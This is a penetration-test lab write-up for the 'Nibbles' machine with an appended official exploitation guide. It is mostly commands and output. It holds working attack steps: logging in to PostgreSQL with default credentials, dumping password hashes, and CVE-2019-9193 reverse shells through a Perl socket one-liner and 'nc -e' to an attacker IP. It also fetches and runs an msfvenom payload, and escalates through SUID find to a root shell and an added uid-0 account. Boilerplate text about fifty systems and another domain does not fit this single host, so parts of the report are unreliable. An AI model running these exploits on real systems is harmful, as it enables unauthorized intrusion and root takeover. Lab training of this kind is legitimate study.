# Nibbles
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| CVE-2019–9193 | Reverse Shell |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of Victor's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, Victor was tasked with exploiting the lab and exam network.

### General Information
* Hostname: nibbles
* Description: This machine will highlight why we have hardening guidelines.
* IP Address: 192.168.224.47
* MAC Address: (ref:) 
* Domain: NIBBLES (ref: enum4linux)
* Distro: Debian (ref:)
* Kernel: 4.19.0-8-amd64 (ref: uname via postgres vulnerability)
* Architecture: x64 (ref: uname via postgres vulnerability)

### Ports
```bash
# output
# Nmap 7.91 scan initiated Fri Jul  9 07:41:34 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/nibbles-nmap-complete 192.168.224.47
Nmap scan report for 192.168.224.47
Host is up (0.082s latency).
Not shown: 65535 open|filtered ports, 65529 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5437/tcp open  pmip6-data

# Nmap done at Fri Jul  9 07:45:46 2021 -- 1 IP address (1 host up) scanned in 252.35 seconds
```

### Service Versions
```
# Nmap 7.91 scan initiated Fri Jul  9 07:52:53 2021 as: nmap -sV -sC -pT:21,22,80,139,445,5437 -oN scans/nibbles-nmap-versions 192.168.224.47
Nmap scan report for 192.168.224.47
Host is up (0.083s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Enter a title, displayed at the top of the window.
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
5437/tcp open  postgresql  PostgreSQL DB 11.3 - 11.7
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
|_ssl-date: TLS randomness does not represent time
Service Info: Host: NIBBLES; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: nibbles
|   NetBIOS computer name: NIBBLES\x00
|   Domain name: \x00
|   FQDN: nibbles
|_  System time: 2021-07-09T07:53:07-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-09T11:53:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  9 07:53:46 2021 -- 1 IP address (1 host up) scanned in 53.11 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Fri Jul  9 07:49:24 2021 as: nmap -O -oN scans/nibbles-nmap-os 192.168.224.47
Nmap scan report for 192.168.224.47
Host is up (0.076s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 - 5.6 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  9 07:49:34 2021 -- 1 IP address (1 host up) scanned in 10.27 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### FTP
```bash
Connected to 192.168.224.47.
220 (vsFTPd 3.0.3)
Name (192.168.224.47:victor): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.
```

### HTTP
Victor was able to discover the hidden directories below using Dirb.
```bash
dirb http://$TARGET:80 -z10 -o scans/$NAME-dirb-common-80

# output
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: scans/nibbles-dirb-common-80
START_TIME: Fri Jul  9 08:08:29 2021
URL_BASE: http://192.168.224.47/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
SPEED_DELAY: 10 milliseconds

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.224.47/ ----
+ http://192.168.224.47/index.html (CODE:200|SIZE:1272)                                                                               
+ http://192.168.224.47/server-status (CODE:403|SIZE:279)                                                                             
                                                                                                                                      
-----------------
END_TIME: Fri Jul  9 08:15:28 2021
DOWNLOADED: 4612 - FOUND: 2
```

Victor was able to discover the hidden directories below using Dirsearch.
```bash
# Dirsearch started Fri Jul  9 08:18:59 2021 as: dirsearch.py -u 192.168.224.47 -o /home/victor/oscp/pg/labs/nibbles/scans/nibbles-dirsearch-common-80

403   279B   http://192.168.224.47:80/.htaccess.save
403   279B   http://192.168.224.47:80/.htaccess_extra
403   279B   http://192.168.224.47:80/.htaccess_orig
403   279B   http://192.168.224.47:80/.htaccess_sc
403   279B   http://192.168.224.47:80/.htaccessBAK
403   279B   http://192.168.224.47:80/.htaccessOLD2
403   279B   http://192.168.224.47:80/.htaccessOLD
403   279B   http://192.168.224.47:80/.htm
403   279B   http://192.168.224.47:80/.ht_wsr.txt
403   279B   http://192.168.224.47:80/.html
403   279B   http://192.168.224.47:80/.htaccess.bak1
403   279B   http://192.168.224.47:80/.htaccess.sample
403   279B   http://192.168.224.47:80/.htaccess.orig
403   279B   http://192.168.224.47:80/.htpasswd_test
403   279B   http://192.168.224.47:80/.htpasswds
403   279B   http://192.168.224.47:80/.httr-oauth
200     1KB  http://192.168.224.47:80/index.html
403   279B   http://192.168.224.47:80/server-status
403   279B   http://192.168.224.47:80/server-status/
```

Victor was able to identify the following HTTP server misconfigurations using Nikto.
```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-80

# output
- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.224.47
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Server may leak inodes via ETags, header found with file /, inode: 4f8, size: 5a34020bc5080, mtime: gzip
+ OPTIONS Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
```

### RPC
```bash
rpcclient -U '' $TARGET
getdompwinfo

# output
min_password_length: 5
password_properties: 0x00000000
```

### NetBIOS
```bash
nbtscan $TARGET

# output
Doing NBT name scan for addresses from 192.168.224.47

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
```

### SMB
The following SMB shares were discovered using Smbclient.
```bash
smbclient -L $TARGET

# output
Enter WORKGROUP\victor's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP
```

The SMB shares discovered have the following permissions.
```bash
smbmap -H $TARGET

# output
[+] IP: 192.168.224.47:445      Name: 192.168.224.47                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

### Password Guessing  
#### Default Credentials
```bash
# Postgres
# postgres:postgress
```

### Postgress
Login.
```bash
psql -U postgres -p 5437 -h $TARGET # postgres:postgres
```

Check if current user is a super-user.
```bash
SELECT current_setting('is_superuser'); #If response is "on" then true, if "off" then false
```

Print password hashes of users in the Postgres database.
```bash
SELECT usename, passwd FROM pg_shadow;
```

Explore the filesytem.
```bash
SELECT pg_ls_dir('/home');
```

Read a file.
```bash
CREATE TABLE demo(t text);
COPY demo from '/home/wilson/local.txt';
SELECT * FROM demo;
```

Using CVE-2019–9193 to invoke a reverse shell to TCP port 21. 
```bash
sudo nc -nvlp 21

DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.49.51:21");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};''';
```

```bash
# attacker side
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.51 LPORT=80 -f elf -o rshell.elf
sudo python3 -m http.server 80 # shutdown after rshell was downloaded on the target

# target side
wget http://192.168.49.51/rshell.elf

# attacker side
sudo nc -nvlp 80

# target side
/tmp/rshell.elf # invoke the rshell
python -c 'import pty; pty.spawn("/bin/bash")'
find / -perm -u=s -type f 2> /dev/null # search for files with the SUID-bit
touch poo
find /tmp/poo -exec whoami \; # confirmed 'find' runs as root
find /tmp/poo -exec /usr/sbin/useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 victor \;
cat /root/proof.txt
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, Victor removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Tools Used
* nmap
* psql
* nc
* msfvenom

## Hints
* Be sure to scan all TCP ports. Identify and enumerate PostgreSQL instance.
* PostgreSQL user credentials are easy to guess. Research how to gain command execution using PostgreSQL.
* Look at SUID binaries.

## Flags
* Local: 5e04b19fef43ddaf1193569a1b5b50d9
* Proof: e8f021d7a90d0bac35371316dfcd3bac

## References
* https://unix.stackexchange.com/questions/453798/no-such-file-or-directory-when-using-exec-with-find
* https://serverfault.com/questions/870043/how-to-create-extra-root-user

## Official Walkthrough
```bash
Exploitation Guide for Nibbles
Summary
We’ll gain code execution on this machine via a misconfigured PostgreSQL database server which is listening on all interfaces and accepts the default credentials. We can then escalate via misconfigured SUID permissions on the /usr/bin/find binary.

Enumeration
Nmap
Let’s begin with a full nmap TCP port scan.

kali@kali:~$ sudo nmap -p- 192.168.234.140
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-14 09:36 EDT
Nmap scan report for 192.168.234.140
Host is up (0.00059s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5437/tcp open  pmip6-data
A focussed scan identifies PostgreSQL running on port 5437.

kali@kali:~$ sudo nmap -p 5437 192.168.234.140 -A -sV -T4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-14 07:59 EDT
Nmap scan report for 192.168.234.140
Host is up (0.00060s latency).

PORT     STATE SERVICE    VERSION
5437/tcp open  postgresql PostgreSQL DB 9.6.0 or later
| fingerprint-strings: 
|   Kerberos: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 27265.28208: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2016
|     RProcessStartupPacket
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2016
|_    RProcessStartupPacket
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-14T11:42:14
|_Not valid after:  2030-04-12T11:42:14
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5437-TCP:V=7.80%I=7%D=4/14%Time=5E95A591%P=x86_64-pc-linux-gnu%r(Ke
SF:rberos,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20frontend\
SF:x20protocol\x2027265\.28208:\x20server\x20supports\x202\.0\x20to\x203\.
SF:0\0Fpostmaster\.c\0L2016\0RProcessStartupPacket\0\0")%r(SMBProgNeg,8C,"
SF:E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20frontend\x20protocol
SF:\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\x203\.0\0Fpostmas
SF:ter\.c\0L2016\0RProcessStartupPacket\0\0");
MAC Address: 00:0C:29:80:6E:6D (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Synology DiskStation Manager 5.2-5644 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.60 ms 192.168.234.140
Exploitation
PostgreSQL Reverse Shell
Since the PostgreSQL server is listening on all interfaces, we can connect to it with psql. Since credentials are required, we begin password guessing and discover that the default credentials (postgres:postgres) are still active.

kali@kali:~$ psql -h 192.168.234.140 -p 5437 -U postgres
Password for user postgres: [postgres]
psql (12.2 (Debian 12.2-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
In addition, the default PostgreSQL settings are also in place, which means we can easily grab a reverse shell. To do this, we’ll first start a web server and host our copy of the Netcat binary.

kali@kali:~$ which nc
/usr/bin/nc
kali@kali:~$ cp /usr/bin/nc .
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

Then, we’ll set up a Netcat listener on port 5437.

kali@kali:~$ nc -lvp 5437
listening on [any] 5437 ...
After switching to the default postgres database, we can download the Netcat binary to the target and use it to connect back to our attack machine.

postgres=# \c postgres;
psql (12.2 (Debian 12.2-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "postgres" as user "postgres".
postgres=# DROP TABLE IF EXISTS cmd_exec;
NOTICE:  table "cmd_exec" does not exist, skipping
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'wget http://192.168.234.30/nc';
COPY 0
postgres=# DELETE FROM cmd_exec;
DELETE 0
postgres=# COPY cmd_exec FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash';
Our listener caught a postgres shell.

kali@kali:~$ nc -lvp 5437
listening on [any] 5437 ...
192.168.234.140: inverse host lookup failed: Unknown host
connect to [192.168.234.30] from (UNKNOWN) [192.168.234.140] 44936
whoami
postgres
id
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
python -c 'import pty; pty.spawn("/bin/bash")'
postgres@debian:/var/lib/postgresql/11/main$
Metasploit Module
Alternatively, we could use the multi/postgres/postgres_copy_from_program_cmd_exec Metasploit module to obtain remote code execution using PostgreSQL.

kali@kali:~$ msfconsole
...
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > options

Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   DATABASE           postgres         yes       The database to authenticate against
   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)
   PASSWORD           postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS             192.168.120.118  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT              5437             yes       The target port (TCP)
   TABLENAME          wpvZUV8OAc       yes       A table name that does not exist (To avoid deletion)
   USERNAME           postgres         yes       The username to authenticate as


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.118.3    yes       The listen address (an interface may be specified)
   LPORT  5437             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > exploit

[*] Started reverse TCP handler on 192.168.118.3:5437 
[*] 192.168.120.118:5437 - 192.168.120.118:5437 - PostgreSQL 11.7 (Debian 11.7-0+deb10u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
[*] 192.168.120.118:5437 - Exploiting...
[+] 192.168.120.118:5437 - 192.168.120.118:5437 - wpvZUV8OAc dropped successfully
[+] 192.168.120.118:5437 - 192.168.120.118:5437 - wpvZUV8OAc created successfully
[+] 192.168.120.118:5437 - 192.168.120.118:5437 - wpvZUV8OAc copied successfully(valid syntax/command)
[+] 192.168.120.118:5437 - 192.168.120.118:5437 - wpvZUV8OAc dropped successfully(Cleaned)
[*] 192.168.120.118:5437 - Exploit Succeeded
[*] Command shell session 1 opened (192.168.118.3:5437 -> 192.168.120.118:49250) at 2020-07-20 11:59:43 -0400

whoami
postgres
Escalation
SUID
As part of our enumeration process, we use find to locate SUID programs and interestingly discover that the find program itself is SUID.

postgres@debian:/var/lib/postgresql/11/main$ find / -perm -u=s -type f 2>/dev/null
<esql/11/main$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/find
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
postgres@debian:/var/lib/postgresql/11/main$
We can easily abuse this misconfiguration to obtain a root shell.

postgres@debian:/var/lib/postgresql/11/main$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
# whoami
whoami
root
```
